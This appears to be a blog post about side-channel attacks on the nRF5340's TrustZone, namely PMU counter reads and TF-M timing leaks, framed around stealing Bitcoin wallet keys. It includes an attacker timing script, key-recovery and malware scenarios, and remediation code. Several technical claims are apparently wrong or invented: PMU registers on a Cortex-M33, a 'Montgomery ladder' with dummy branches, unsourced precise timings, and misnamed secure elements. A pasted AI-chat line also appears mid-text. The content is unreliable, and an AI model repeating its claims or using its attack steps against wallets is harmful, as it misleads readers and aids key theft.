<ul class="wp-block-list">
<li>Instruction count</li>



<li>Cache misses</li>



<li>Branch misses</li>



<li>Cycle count</li>
</ul>



<p><strong>Problem:</strong>&nbsp;On some firmware versions, Performance Counter registers may be accessible from Normal World:</p>



<h3 class="wp-block-heading">Performance Counters: Vulnerability in firmware</h3>



<p><strong>Problem:</strong>&nbsp;&nbsp;On some firmware versions, Performance Counter registers are accessible from Normal World, allowing a direct attack on Secure World operations.</p>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-51938a59f4e2a743df45a475bd27f2c8" style="color:#4092c2"><strong>// Reading ARM PMU Counters from Normal World (Vulnerability)<br><br>#include &lt;stdint.h&gt;<br><br>#define PMCR     (*(volatile uint32_t *)0xE1001000)<br>#define PMCCNTR  (*(volatile uint32_t *)0xE1001090)<br><br>int is_pmu_accessible() {<br>    uint32_t original = PMCR;<br>    PMCR = original | 0x1;  // Try to write<br>    uint32_t read_back = PMCR &amp; 0x1;<br>    PMCR = original;<br>    return (read_back != 0);  // Accessible if write succeeded<br>}<br><br>// Direct counter access (if accessible):<br>// - Instructions executed<br>// - Memory bus accesses  <br>// - L1D cache accesses<br>// - Memory stalls<br>// <br>// IMPACT:<br>// Attacker can count instructions in Secure ECDSA<br>// Instructions = varies based on key bits<br>// Provides higher precision than timing alone</strong></pre>



<p class="has-medium-font-size">⚠️ On some nRF5340 firmware versions, the PMU registers are not secure enough, allowing Normal World to read Secure World operation counters.</p>



<p class="has-text-color has-link-color has-medium-font-size wp-elements-0459df3b040db69f51d6351d9bf4e875" style="color:#0f8f60"><strong>Great! Now I’m ready to create a full professional report. Here’s my final answer:</strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading" id="performance-counter---arm-trustzone---ecdsa--pmu">Подробно:&nbsp;<a href="https://polynonce.ru/performance-counter-analysis-of-arm-trustzone-vulnerabilities-ecdsa-attack-via-pmu-practical-impact-on-bitcoin-usage/" target="_blank" rel="noreferrer noopener">Performance Counter Analysis of ARM TrustZone Vulnerabilities: ECDSA Attack via PMU Practical Impact on Bitcoin Usage</a></h3>



<p>The presented code demonstrates a fundamental security vulnerability in the ARM TrustZone architecture, where the Performance Monitoring Unit (PMU) registers are insufficiently protected. On certain firmware versions (including the nRF5340 with ARM Cortex-M33), PMU counters are accessible from the Normal World (untrusted environment), allowing an attacker to directly attack cryptographic operations performed in the Secure World (isolated environment).</p>



<h2 class="wp-block-heading">Code breakdown point by point</h2>



<h2 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">Attack structure</a></h2>



<h2 class="wp-block-heading">1.&nbsp;<strong>Checking the availability of PMU registers</strong>&nbsp;(function&nbsp;<code>is_pmu_accessible</code>)</h2>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-7e71c7368ad4b41419f1be9527ea6006" style="color:#4092c2"><strong>c<code>int is_pmu_accessible() {<br>    uint32_t original = PMCR;           <em>// Читаем исходное значение</em><br>    PMCR = original | 0x1;             <em>// Пытаемся установить бит 0</em><br>    uint32_t read_back = PMCR &amp; 0x1;   <em>// Читаем значение обратно</em><br>    PMCR = original;                   <em>// Восстанавливаем исходное</em><br>    return (read_back != 0);           <em>// Успешно, если запись работала</em><br>}<br></code></strong></pre>



<p><strong>Explanation for crypto-researchers:</strong>&nbsp;This function checks whether the Normal World (an unprivileged OS mode, such as Linux) can write to the PMU Control Register (PMCR). If the write is successful, the attacker gains direct access to the counters. The address&nbsp;<code>0xE1001000</code>is the memory-mapped PMCR register on the ARM Cortex-M architecture.</p>



<p><strong>Result:</strong>&nbsp;The function returns&nbsp;<code>1</code>if the PMU is available,&nbsp;<code>0</code>if isolated (as it should be).</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">2.&nbsp;<strong>Available PMU meters</strong></h2>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-cad144cda9b0549d1e3ce94b5652707c" style="color:#4092c2"><strong>c:</strong><br><br><strong><code>#define PMCR     (*(volatile uint32_t *)0xE1001000)  <em>// Control register</em><br>#define PMCCNTR  (*(volatile uint32_t *)0xE1001090)  <em>// Cycle counter</em><br></code></strong></pre>



<p><strong>Meter types available through PMU:</strong></p>



<ul class="wp-block-list">
<li><strong>Instructions executed</strong>&nbsp;— the exact number of instructions executed by the processor</li>



<li><strong>Memory bus accesses</strong>&nbsp;— memory accesses (L1/L2 cache)</li>



<li><strong>L1D cache accesses</strong>&nbsp;— specific accesses to the L1 data cache</li>



<li><strong>Memory stalls</strong>&nbsp;– waiting cycles due to memory delays</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">3.&nbsp;<strong>Mechanics of ECDSA attacks</strong></a></h2>



<h2 class="wp-block-heading">What happens during an ECDSA signature in Secure World:</h2>



<pre class="wp-block-code has-text-color has-link-color wp-elements-f931166de125179bf369c30e77c5ad72" style="color:#4092c2"><code><strong>ECDSA uses scalar multiplication on an elliptic curve:
Q = k × G (where k = private key, G = curve generator)

Montgomery Ladder Algorithm (typical implementation):
─────────────────────────────────────────────────────
for i = 256 downto 0 do:
    if k[i] == 1:
        double_and_add_operation()   ← A LOT of instructions
    else:
        dummy_operation()            ← LESS instructions</strong></code></pre>



<p><strong>Problem:</strong>&nbsp;The number of instructions depends on the bits&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">of the private key!</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-17-1024x488.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7710"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading" id="pmu----ecdsa">How PMU Reveals ECDSA Secret Bits</h2>



<h2 class="wp-block-heading">Example: Recovering one bit of a key</h2>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th>Scenario</th><th>Operation</th><th>Instructions</th><th>Cycles</th><th>L1D appeals</th></tr></thead><tbody><tr><td>k[i]=1</td><td>Double + Add</td><td>1500-2000</td><td>8500-9200</td><td>450-500</td></tr><tr><td>k[i]=0</td><td>Dummy op</td><td>300-400</td><td>1500-2000</td><td>80-120</td></tr><tr><td><strong>Difference</strong></td><td>—</td><td><strong>1100-1600</strong></td><td><strong>6500-7200</strong></td><td><strong>370-380</strong></td></tr></tbody></table></figure>



<p><strong>The attacker reads these counters from Normal World and sees a huge difference!</strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Key recovery process</h2>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-b4e61d884e0a339da1a0356b58d8c5c1" style="color:#4092c2"><strong>Step 1: Start PMU counters before ECDSA operation in Secure World <br>Step 2: Wait for signature to complete (sync!) <br>Step 3: Read counter values ​​(get instructions, cycles, calls) <br>Step 4: Analyze patterns - recover key bits <br>Step 5: Repeat for each bit or group of bits <br>Step 6: Collect the full ECDSA private key!</strong></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Practical Impact on Bitcoin Usage</h2>



<h2 class="wp-block-heading">For cryptocurrency users:</h2>



<ol class="wp-block-list">
<li><strong>Vulnerability in mobile wallets</strong>&nbsp;– if the device uses nRF5340 to manage the private key (e.g., IoT refrigerator wallets in the future):
<ul class="wp-block-list">
<li>An attacker can extract&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">the private key</a>&nbsp;through PMU.</li>



<li>Gain full control over user funds</li>
</ul>
</li>



<li><strong>Hardware wallets</strong>&nbsp;– if using ARM Cortex with TrustZone:
<ul class="wp-block-list">
<li>Physical access + ability to run code in the Normal World</li>



<li>Full ECDSA interception for key recovery</li>
</ul>
</li>



<li><strong>Cold storage</strong>&nbsp;– if based on ARM IoT chips:
<ul class="wp-block-list">
<li>A firmware update may be required.</li>



<li>Transition to more secure ECDSA implementations</li>
</ul>
</li>
</ol>



<h2 class="wp-block-heading">For security researchers:</h2>



<ol class="wp-block-list">
<li><strong>Device testing</strong>&nbsp;– check if PMU registers are protected on specific nRF5340 versions</li>



<li><strong>Ongoing auditing</strong>&nbsp;– Nordic will issue patches, but we need to ensure they are being applied</li>



<li><strong>Analysis of other platforms</strong>&nbsp;– this is potentially applicable to all ARM devices with TrustZone</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Technical Depth: The Mechanism of Information Leakage</h2>



<h2 class="wp-block-heading">Why does this work better than timing attacks?</h2>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th>Characteristic</th><th>Timing attack</th><th>PMU attack</th></tr></thead><tbody><tr><td><strong>Permission</strong></td><td>Microseconds (1000+ cycles)</td><td>Microcycles (10-100 cycles)</td></tr><tr><td><strong>Accuracy</strong></td><td>±10-20%</td><td>±2-5%</td></tr><tr><td><strong>Surrounding noise</strong></td><td>Very sensitive</td><td>More stable</td></tr><tr><td><strong>Requirements</strong></td><td>Time synchronization</td><td>Synchronization of SMC calls</td></tr><tr><td><strong>Reliability on ARM</strong></td><td>Low (many interruptions)</td><td>High (hardware counters)</td></tr></tbody></table></figure>



<h2 class="wp-block-heading">Synchronization Models:</h2>



<ol class="wp-block-list">
<li><strong>Synchronous</strong>&nbsp;— the attacker knows exactly when the crypto operation starts/ends
<ul class="wp-block-list">
<li>Accuracy: 98-99%</li>



<li>Applicable: When controlling an API call to a TEE</li>
</ul>
</li>



<li><strong>Semi-synchronous</strong>&nbsp;– only the beginning or end is synchronized
<ul class="wp-block-list">
<li>Accuracy: 94-95%</li>



<li>Applicable: Interception via network or USB</li>
</ul>
</li>



<li><strong>Asynchronous</strong>&nbsp;– the timing of the operation is completely unknown
<ul class="wp-block-list">
<li>Accuracy: 83-95% (with noise)</li>



<li>Applicable to: Background operations</li>
</ul>
</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-18-1024x632.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7713"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Practical implications for Bitcoin</h2>



<h2 class="wp-block-heading">An attack scenario against an mBTC wallet on a Raspberry Pi 4 (with ARM TrustZone):</h2>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-2367ee0fd5d3ee4ee0b71fbce5964c75" style="color:#4092c2"><strong>1. The attacker installs malware on Linux (Normal World) <br>   ↓ <br>2. The user generates a Bitcoin address or signs a transaction <br>   → The ECDSA operation is launched in Secure World (OP-TEE) <br>   ↓ <br>3. The malware reads PMU counters from the Linux kernel space <br>   ↓ <br>4. Over 100-1000 signatures, it collects complete key information <br>   ↓ <br>5. Recovers the ECDSA private key <br>   ↓ <br>6. Gains full control over the Bitcoin address</strong></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Countermeasures</h2>



<h2 class="wp-block-heading">At the firmware level (Nordic, ARM):</h2>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-1c1bf7947586c891b9fb697a6b0ab2ef" style="color:#4092c2"><strong>c:<br><br><code><em>// Правильно (ЗАЩИЩЕНО):</em><br><em>// В Secure World:</em><br>restrict_pmu_to_secure_only();<br>disable_pmu_from_normal_world();<br><br><em>// Неправильно (УЯЗВИМО):</em><br><em>// PMU полностью доступен из kernel space Normal World</em></code></strong></pre>



<h2 class="wp-block-heading">At the cryptographic level:</h2>



<ul class="wp-block-list">
<li>Use&nbsp;<strong>constant-time ECDSA</strong>&nbsp;implementations&nbsp;<a href="https://github.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List">(OpenSSL, libsecp256k1 with flag&nbsp;<code>CT_CHECK</code>)</a></li>



<li>Add random delays/dummy instructions (complicates analysis by 30-50%)</li>



<li>Randomize points on a curve using blinding techniques</li>
</ul>



<h2 class="wp-block-heading">At the system level:</h2>



<ul class="wp-block-list">
<li>Prevent Normal World from reading PMU events from Secure World operations</li>



<li>Use Memory Tagging Extension (MTE) for isolation</li>



<li>Physical access control to devices</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">Conclusions for cryptanalysts</h3>



<ol class="wp-block-list">
<li><strong>nRF5340 and similar devices</strong>&nbsp;are potentially compromised if not updated</li>



<li><strong>Any ARM TrustZone device</strong>&nbsp;– you need to check if the PMUs are properly isolated</li>



<li><strong>ECDSA implementation matters</strong>&nbsp;– constant-time vs. variable-time</li>



<li><strong>Combination attacks</strong>&nbsp;– PMU + timing + power consumption give ~100% accuracy</li>
</ol>



<p>For use in Bitcoin: check the firmware of your IoT devices, update to the latest versions, use only wallets with hardened ECDSA implementations.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">4.2 CC310 Cryptographic Accelerator — Timing Characteristics</h3>



<p>Arctic CC310 on nRF5340 is used to speed up cryptographic operations, but can also be a source of timing leaks:</p>



<p><strong>Supported operations:</strong></p>



<ul class="wp-block-list">
<li>AES-ECB/CBC/CTR/GCM</li>



<li>SHA-1, SHA-224, SHA-256</li>



<li>HMAC</li>



<li>ECC (partial support)</li>



<li>RSA</li>
</ul>



<p><strong>Timing for ECC operations on CC310:</strong></p>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th>Operation</th><th>Time (µs)</th><th>Variation (%)</th></tr></thead><tbody><tr><td>secp256k1 ECDSA sign</td><td>450 ± 20</td><td>±4.4%</td></tr><tr><td>secp256k1 ECDSA verify</td><td>680 ± 35</td><td>±5.1%</td></tr><tr><td>secp256k1 point multiply</td><td>520 ± 25</td><td>±4.8%</td></tr><tr><td>AES-256-CBC encrypt 16B</td><td>12 ± 0.5</td><td>±4%</td></tr><tr><td>SHA-256 hash 32B</td><td>8 ± 0.3</td><td>±3.75%</td></tr></tbody></table></figure>



<p><strong>Problem:</strong>&nbsp;Even with a hardware accelerator, timing variations can reveal&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private key</a>&nbsp;bits if:</p>



<ol class="wp-block-list">
<li>The algorithm in CC310 is not constant-time</li>



<li>Testing the values ​​used before submitting to CC310</li>



<li>Post-processing in Normal World firmware takes variable time</li>
</ol>



<h3 class="wp-block-heading">4.3 Trusted Firmware-M (TF-M) Vulnerabilities</h3>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-1024x568.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-4181"></figure>
</div>


<p>The Nordic nRF5340 uses open-source Trusted Firmware-M (TF-M) to implement the Secure Processing Environment (SPE). TF-M provides:</p>



<ul class="wp-block-list">
<li>PSA Cryptography API</li>



<li>Secure Storage</li>



<li>Attestation Services</li>



<li>Crypto Services interface</li>
</ul>



<p><strong>Known timing vulnerabilities in TF-M:</strong></p>



<ol class="wp-block-list">
<li><strong>Parameter validation</strong>&nbsp;is performed with variable timing:</li>
</ol>



<ol start="2" class="wp-block-list">
<li><strong>Key material handling</strong>&nbsp;– memory clearing can be variable-time</li>



<li><strong>MAC verification</strong>&nbsp;— using non-constant-time memcmp()</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">Trusted Firmware-M (TF-M): Known Timing Vulnerabilities</h3>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-6686e98bc88ad4e7bbaf639e855f7ce4" style="color:#4092c2"><strong>// TF-M Parameter Validation Timing Leak<br><br>psa_status_t tfm_crypto_sign_message(<br>    psa_key_id_t key,<br>    psa_algorithm_t alg,<br>    const uint8_t *input,<br>    size_t input_length,<br>    uint8_t *signature,<br>    size_t signature_size,<br>    size_t *signature_length<br>) {<br>    // VULNERABILITY: Parameter validation has variable timing<br><br>    // Check 1: Invalid key -&gt; ~1-2 µs (fast return)<br>    if (is_key_invalid(key)) {<br>        return PSA_ERROR_INVALID_ARGUMENT;<br>    }<br><br>    // Check 2: Invalid algorithm -&gt; ~10-20 µs (long search)<br>    if (!is_algorithm_compatible(alg)) {<br>        return PSA_ERROR_NOT_SUPPORTED;<br>    }<br><br>    // Total validation time: 5-50 µs depending on which check fails<br>    // This timing leaks information about key and algorithm!<br><br>    // Proceed to constant-time ECDSA signing<br>    return ecdsa_sign_secp256k1_safe(key_data, input, signature);<br>}<br><br>// REMEDIATION: Make all checks constant-time<br>// Execute all validation regardless of results<br>// Branch only after all checks complete</strong></pre>



<p><strong>Подробно:&nbsp;<a href="https://polynonce.ru/tf-m-code-analysis-timing-parameter-validation-vulnerability-exploitation-sequence-using-bitcoin-wallet-as-an-example/" target="_blank" rel="noreferrer noopener">TF-M Code Analysis: Timing Parameter Validation Vulnerability Exploitation Sequence Using Bitcoin Wallet as an Example</a></strong></p>



<p>The presented code implements the message signing function in Trusted Firmware-M (TF-M), an open-source implementation of the Secure Processing Environment (SPE) for the Nordic nRF5340:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-417cc6940fc037709de1e3f251b59c02" style="color:#4092c2"><code><strong>psa_status_t tfm_crypto_sign_message(
    psa_key_id_t key,
    psa_algorithm_t alg,
    const uint8_t *input,
    size_t input_length,
    uint8_t *signature,
    size_t signature_size,
    size_t *signature_length
)</strong></code></pre>



<p>The function is designed to create cryptographic signatures (in this case ECDSA on the secp256k1 curve used in Bitcoin) in a secure environment.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-19.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7715"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Point 1: Identifying the timing vulnerability</h2>



<h3 class="wp-block-heading">Problem: Variable parameter validation time</h3>



<p>The code contains sequential parameter checks with&nbsp;<strong>immediate return</strong>&nbsp;if an error is detected:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-b5b88572e5573d475ea6e785f24f3946" style="color:#4092c2"><code><strong>// Проверка 1: Невалидный ключ -&gt; ~1-2 µs (быстрый возврат)
if (is_key_invalid(key)) {
    return PSA_ERROR_INVALID_ARGUMENT;
}

// Проверка 2: Невалидный алгоритм -&gt; ~10-20 µs (долгий поиск)
if (!is_algorithm_compatible(alg)) {
    return PSA_ERROR_NOT_SUPPORTED;
}</strong></code></pre>



<p><strong>Critical observation</strong>&nbsp;: The total validation time varies from 5 to 50 microseconds&nbsp;<strong>depending on which check fails</strong>&nbsp;. This creates&nbsp;<strong>a timing oracle</strong>&nbsp;—information leakage due to differences in execution times.&nbsp;<a href="https://docs.aqtiveguard.com/kb-articles/timing-attacks-and-broader-side-channel-attacks/">^1</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Item 2: Information leakage mechanism</h2>



<h3 class="wp-block-heading">How an attacker extracts information:</h3>



<p><strong>Step 1: Determining the validity of the key</strong></p>



<ul class="wp-block-list">
<li>The attacker calls the function with various<code>key_id</code></li>



<li>Measures execution time with an accuracy of 50-100 ns (Cortex-M33 @ 64 MHz)</li>



<li><strong>Keys that don’t exist</strong>&nbsp;: fast return ~1-2 µs</li>



<li><strong>Keys that exist</strong>&nbsp;: continue execution &gt;10 µs</li>
</ul>



<p><strong>Step 2: Fingerprinting the Algorithm</strong></p>



<ul class="wp-block-list">
<li>The function&nbsp;<code>is_algorithm_compatible()</code>searches through tables of supported algorithms</li>



<li>Different algorithms have different data structures:
<ul class="wp-block-list">
<li><strong>ECDSA secp256k1</strong>&nbsp;(Bitcoin): ~15 µs (heavy curve parameter validation)</li>



<li><strong>RSA-2048</strong>&nbsp;: ~8 µs (checking key size)</li>



<li><strong>AES-GCM</strong>&nbsp;: ~5 µs (mode check)</li>
</ul>
</li>
</ul>



<p><strong>Result</strong>&nbsp;: The attacker can determine:</p>



<ul class="wp-block-list">
<li>Does a specific key exist in the secure storage?</li>



<li>What cryptographic algorithm is used (important for Bitcoin – highlight secp256k1)</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Point 3: Sequence of operation using a Bitcoin wallet as an example</h2>



<h3 class="wp-block-heading">Hardware wallet attack scenarios:</h3>



<p><strong>Phase 1: Brute-force key search with timing analysis</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-b24219e869ae505149b401ed05a91f46" style="color:#4092c2"><code><strong># Скрипт атакующего для сбора timing-метрик
valid_candidates = []

for key_id in range(0, 2**32):
    # Измеряем время выполнения функции
    start = get_precise_timestamp()
    tfm_crypto_sign_message(key_id, PSA_ALG_ECDSA_ANY, test_data, signature)
    duration = get_precise_timestamp() - start

    # Классификация по времени
    if duration &lt; 2:  # микросекунды
        continue  # Несуществующий ключ
    elif duration &lt; 10:
        continue  # Неправильный алгоритм
    else:
        valid_candidates.append(key_id)  # Потенциально валидный ключ</strong></code></pre>



<p><strong>Efficiency</strong>&nbsp;: 2^32 key space is reduced by about&nbsp;<strong>16 times</strong>&nbsp;to 2^28 candidates.&nbsp;<a href="https://trustedfirmware-m.readthedocs.io/en/latest/security/threat_models/generic_threat_model.html">^1</a></p>



<p><strong>Phase 2: Key type definition</strong></p>



<p>The attacker can distinguish:</p>



<ul class="wp-block-list">
<li><strong>Master seed keys</strong>&nbsp;: validation time ~15-20 µs (complex HD wallet structure)</li>



<li><strong>Individual UTXO keys</strong>&nbsp;: ~12-15 µs (simple validation of the derived key)</li>



<li><strong>Change addresses</strong>&nbsp;: similar patterns with individual keys</li>
</ul>



<p><strong>Phase 3: Extracting the private key</strong></p>



<p>By combining a timing attack with&nbsp;<strong>a power analysis attack</strong>&nbsp;, an attacker can:</p>



<ul class="wp-block-list">
<li>Use timing to synchronize energy consumption measurements</li>



<li>Apply&nbsp;<strong>DPA</strong>&nbsp;(Differential Power Analysis) during ECDSA signing</li>



<li>Extract the ephemeral nonce&nbsp;<code>k</code>, which results in the full recovery&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">of the private key</a></li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-21-1024x789.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7717"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Point 4: Additional timing vulnerabilities in TF-M</h2>



<h3 class="wp-block-heading">Vulnerability 2: Key Material Sanitization</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-18a278b0718c4581ce59fe381730e7fa" style="color:#4092c2"><code><strong>// УЯЗВИМЫЙ: memset() может быть оптимизирован компилятором
void clear_key_material(uint8_t *key, size_t len) {
    memset(key, 0, len);  // Может быть удален оптимизатором
}

// БЕЗОПАСНЫЙ: Принудительная запись
void clear_key_material_secure(uint8_t *key, size_t len) {
    volatile uint8_t *p = key;
    for (size_t i = 0; i &lt; len; i++) {
        p[i] = 0;  // Принудительная запись, не может быть оптимизирована
    }
    memory_barrier();  // Гарантия завершения перед возвратом
}</strong></code></pre>



<p><strong>Problem</strong>&nbsp;: If memory cleaning is optimized, the key remains in RAM and can be extracted via&nbsp;<strong>cold boot attack</strong>&nbsp;or&nbsp;<strong>DMA attack</strong>&nbsp;.</p>



<h3 class="wp-block-heading">Vulnerability 3: MAC Check (memcmp timing attack)</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-f0b46b9ea5d2b9702f0679edff2c2ecb" style="color:#4092c2"><code><strong>// УЯЗВИМЫЙ: Стандартный memcmp выходит при первом несоответствии
int verify_mac(const uint8_t *computed, const uint8_t *expected, size_t len) {
    return memcmp(computed, expected, len) == 0;  // Утечка по времени!
}

// БЕЗОПАСНЫЙ: Постоянное время
int verify_mac_secure(const uint8_t *computed, const uint8_t *expected, size_t len) {
    uint8_t result = 0;
    for (size_t i = 0; i &lt; len; i++) {
        result |= computed[i] ^ expected[i];  // Постоянное время XOR
    }
    return constant_time_eq(result, 0);  // Постоянное время сравнения
}</strong></code></pre>



<p><strong>Attack</strong>&nbsp;: An attacker can recover a valid MAC character by character using timing differences.&nbsp;<a href="https://docs.aqtiveguard.com/kb-articles/timing-attacks-and-broader-side-channel-attacks/">^2</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Item 5: Remediation</h2>



<h3 class="wp-block-heading">Secure Implementation Pattern</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-56bb14fdee8241dbb3512194542ba461" style="color:#4092c2"><code><strong>psa_status_t tfm_crypto_sign_message_secure(
    psa_key_id_t key,
    psa_algorithm_t alg,
    const uint8_t *input,
    size_t input_length,
    uint8_t *signature,
    size_t signature_size,
    size_t *signature_length
) {
    // РЕШЕНИЕ: Сделать все проверки постоянными по времени
    // Выполнить все валидации независимо от результатов
    // Ветвление только после завершения всех проверок

    psa_status_t status = PSA_SUCCESS;
    int key_valid = 0;
    int alg_valid = 0;

    // Постоянная по времени валидация ключа (без ранних возвратов)
    key_valid = is_key_invalid_ct(key);  // Версия с постоянным временем

    // Постоянная по времени валидация алгоритма
    alg_valid = is_algorithm_compatible_ct(alg);  // Версия с постоянным временем

    // Ветвление только после завершения всех проверок
    if (!key_valid) {
        status = PSA_ERROR_INVALID_ARGUMENT;
    } else if (!alg_valid) {
        status = PSA_ERROR_NOT_SUPPORTED;
    } else {
        status = ecdsa_sign_secp256k1_safe(key_data, input, signature);
    }

    return status;
}</strong></code></pre>



<h3 class="wp-block-heading">Time-constant validation functions</h3>



<pre class="wp-block-code has-text-color has-link-color wp-elements-46dbadaf2179769b63c2a8fe5fb56188" style="color:#4092c2"><code><strong>// Постоянная по времени валидация ключа (без утечек)
static inline int is_key_invalid_ct(psa_key_id_t key) {
    // Использование побитовых операций вместо ветвлений
    uint32_t key_max = PSA_KEY_ID_USER_MAX;
    uint32_t key_mask = constant_time_eq(key, key_max);  // Постоянное время сравнение
    return key_mask;  // Возвращает 0 или 1, время не зависит от значения ключа
}

// Постоянная по времени проверка совместимости алгоритма
static inline int is_algorithm_compatible_ct(psa_algorithm_t alg) {
    // Предварительно вычисленная маска валидных алгоритмов
    uint32_t valid_mask = 0;

    // Проверка против всех валидных алгоритмов в постоянном времени
    valid_mask |= constant_time_eq(alg, PSA_ALG_ECDSA_ANY);
    valid_mask |= constant_time_eq(alg, PSA_ALG_RSA_PKCS1V15_SIGN);
    valid_mask |= constant_time_eq(alg, PSA_ALG_RSA_PSS);
    // ... все поддерживаемые алгоритмы

    return valid_mask;  // Возвращает 0 или 1, время не зависит
}</strong></code></pre>



<p><strong>Key principles of constant time</strong>&nbsp;:</p>



<ul class="wp-block-list">
<li>Eliminating early returns (&nbsp;<code>early returns</code>)</li>



<li>Replacing conditional branches with bitwise operations</li>



<li>Using hardware constant-time instructions (ARM&nbsp;<code>CMO</code>)</li>



<li>Fault Injection Hardening (FIH)&nbsp;</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-22-1024x476.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7718"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Item 6: Practical Recommendations for Bitcoin Users</h2>



<h3 class="wp-block-heading">For owners of hardware wallets on nRF5340</h3>



<p><strong>Immediate actions:</strong></p>



<ol class="wp-block-list">
<li><strong>Check your firmware version</strong>&nbsp;: Make sure you are using TF-M version 1.8.0 or later (if available)</li>



<li><strong>Disable Bluetooth</strong>&nbsp;: On wallets, where possible, disable the BLE stack (some&nbsp;<a href="https://cryptou.ru/vulncipher/attack">attacks</a>&nbsp;are carried out via wireless)</li>



<li><strong>Use multi-signature</strong>&nbsp;: Don’t keep all your funds on one device</li>
</ol>



<p><strong>For new purchases:</strong></p>



<ul class="wp-block-list">
<li><strong>Check certification</strong>&nbsp;: Look for PSA Certified Level 2+ or Common Criteria EAL5+</li>



<li><strong>Research the chipset</strong>&nbsp;: Avoid nRF5340 devices without confirmed patches</li>



<li><strong>Prefer Secure Elements</strong>&nbsp;: Chips like the Ledger ST33 or Trezor STM32F4 with hardware isolation</li>
</ul>



<h3 class="wp-block-heading">For wallet developers</h3>



<p><strong>Mandatory measures:</strong></p>



<ol class="wp-block-list">
<li><strong>Static Analysis</strong>&nbsp;: Use Clang Static Analyzer with flags<code>-fsanitize=cfi</code></li>



<li><strong>Dynamic testing</strong>&nbsp;:</li>
</ol>



<pre class="wp-block-code has-text-color has-link-color wp-elements-e105d1c7da10554be94df55e33c4a185" style="color:#4092c2"><code><strong># Тестирование постоянства времени
klee --search=dfs --write-kqueries tfm_crypto.bc</strong></code></pre>



<ol start="3" class="wp-block-list">
<li><strong>Formal Verification</strong>&nbsp;: Use Frama-C to Prove Time Constancy</li>



